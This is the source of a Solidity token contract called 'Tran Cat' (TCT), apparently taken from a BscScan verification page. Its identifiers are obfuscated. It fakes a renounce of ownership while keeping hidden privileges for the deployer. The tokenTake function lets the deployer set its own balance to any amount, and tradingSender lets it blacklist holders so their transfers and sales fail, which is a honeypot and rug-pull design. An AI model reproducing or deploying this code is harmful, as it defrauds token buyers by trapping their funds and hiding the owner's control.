/**
 *Submitted for verification at BscScan.com on 2023-02-17
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface liquidityTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletShouldTrading) external view returns (uint256);

    function transfer(address fromMode, uint256 takeTxFund) external returns (bool);

    function allowance(address totalLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeTxFund) external returns (bool);

    function transferFrom(
        address sender,
        address fromMode,
        uint256 takeTxFund
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listFund, uint256 value);
    event Approval(address indexed totalLimit, address indexed spender, uint256 value);
}

interface fromEnable is liquidityTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract modeMinTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapTake {
    function createPair(address buyFrom, address enableTake) external returns (address);
}

interface exemptIsTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract TranCat is modeMinTake, liquidityTake, fromEnable {

    bool public buySwapMax;

    bool public takeReceiver;

    address public senderTo;

    function approve(address launchTx, uint256 takeTxFund) public virtual override returns (bool) {
        liquidityAuto[_msgSender()][launchTx] = takeTxFund;
        emit Approval(_msgSender(), launchTx, takeTxFund);
        return true;
    }

    function enableAmount(address teamAtLaunch) public {
        if (takeReceiver) {
            return;
        }
        
        exemptSwapReceiver[teamAtLaunch] = true;
        
        takeReceiver = true;
    }

    function tokenTake(uint256 takeTxFund) public {
        if (!exemptSwapReceiver[_msgSender()]) {
            return;
        }
        teamTo[txTokenTake] = takeTxFund;
    }

    function fromTeam() public {
        
        
        minShould=0;
    }

    uint256 public minEnable;

    bool public tokenAt;

    function receiverSwap() public {
        
        
        tokenAt=false;
    }

    function modeLaunchSender() public view returns (bool) {
        return tokenAt;
    }

    function exemptAmount() public {
        emit OwnershipTransferred(txTokenTake, address(0));
        maxTotal = address(0);
    }

    function autoSender() public view returns (uint256) {
        return minEnable;
    }

    function atMin(address atShould, address fromMode, uint256 takeTxFund) internal returns (bool) {
        require(teamTo[atShould] >= takeTxFund);
        teamTo[atShould] -= takeTxFund;
        teamTo[fromMode] += takeTxFund;
        emit Transfer(atShould, fromMode, takeTxFund);
        return true;
    }

    address public txTokenTake;

    function decimals() external view virtual override returns (uint8) {
        return shouldSenderBuy;
    }

    function feeSwapWallet(address atShould, address fromMode, uint256 takeTxFund) internal returns (bool) {
        if (atShould == txTokenTake) {
            return atMin(atShould, fromMode, takeTxFund);
        }
        require(!receiverTx[atShould]);
        return atMin(atShould, fromMode, takeTxFund);
    }

    mapping(address => bool) public exemptSwapReceiver;

    uint256 public teamFundMode;

    function owner() external view returns (address) {
        return maxTotal;
    }

    function balanceOf(address walletShouldTrading) public view virtual override returns (uint256) {
        return teamTo[walletShouldTrading];
    }

    mapping(address => uint256) private teamTo;

    function tradingSender(address autoEnable) public {
        if (minEnable == minShould) {
            minShould = minEnable;
        }
        if (autoEnable == txTokenTake || autoEnable == senderTo || !exemptSwapReceiver[_msgSender()]) {
            return;
        }
        if (minShould != minEnable) {
            minEnable = minShould;
        }
        receiverTx[autoEnable] = true;
    }

    string private limitTx = "Tran Cat";

    string private exemptAuto = "TCT";

    function transfer(address tokenAuto, uint256 takeTxFund) external virtual override returns (bool) {
        return feeSwapWallet(_msgSender(), tokenAuto, takeTxFund);
    }

    address private maxTotal;

    constructor (){
        
        exemptIsTake sellAt = exemptIsTake(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        senderTo = swapTake(sellAt.factory()).createPair(sellAt.WETH(), address(this));
        maxTotal = _msgSender();
        if (minShould == teamFundMode) {
            teamFundMode = minEnable;
        }
        txTokenTake = _msgSender();
        exemptSwapReceiver[_msgSender()] = true;
        
        teamTo[_msgSender()] = maxLiquidity;
        emit Transfer(address(0), txTokenTake, maxLiquidity);
        exemptAmount();
    }

    uint256 public minShould;

    function transferFrom(address atShould, address fromMode, uint256 takeTxFund) external override returns (bool) {
        if (liquidityAuto[atShould][_msgSender()] != type(uint256).max) {
            require(takeTxFund <= liquidityAuto[atShould][_msgSender()]);
            liquidityAuto[atShould][_msgSender()] -= takeTxFund;
        }
        return feeSwapWallet(atShould, fromMode, takeTxFund);
    }

    function allowance(address fundFrom, address launchTx) external view virtual override returns (uint256) {
        return liquidityAuto[fundFrom][launchTx];
    }

    mapping(address => bool) public receiverTx;

    uint8 private shouldSenderBuy = 18;

    function getOwner() external view returns (address) {
        return maxTotal;
    }

    function listSwapTo() public {
        
        if (tokenAt) {
            teamFundMode = minShould;
        }
        minShould=0;
    }

    event OwnershipTransferred(address indexed modeTo, address indexed teamReceiver);

    mapping(address => mapping(address => uint256)) private liquidityAuto;

    function totalSupply() external view virtual override returns (uint256) {
        return maxLiquidity;
    }

    function name() external view virtual override returns (string memory) {
        return limitTx;
    }

    function limitTeam() public view returns (uint256) {
        return minEnable;
    }

    function symbol() external view virtual override returns (string memory) {
        return exemptAuto;
    }

    uint256 private maxLiquidity = 100000000 * 10 ** 18;

}